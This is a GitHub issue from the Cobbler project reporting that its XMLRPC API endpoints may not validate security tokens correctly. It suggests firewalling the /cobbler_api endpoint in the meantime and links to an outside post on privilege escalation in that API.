The Cobbler XMLRPC API needs to be carefully examined with security in mind to make sure that all of the API endpoints are validating their security tokens correctly.

In the meantime, consider using a firewall to restrict/disable access to the `/cobbler_api` endpoint.

See [this post](https://movermeyer.com/2018-08-02-privilege-escalation-exploits-in-cobblers-api/) for more discussion.

## Metadata

### Assignees

No one assigned

### Labels

[Bug ReportReporting a bug](https://github.com/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22)Reporting a bug[PriorityIssues that will be worked on with higher priority.](https://github.com/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Priority%22)Issues that will be worked on with higher priority.[Security](https://github.com/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Security%22)
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


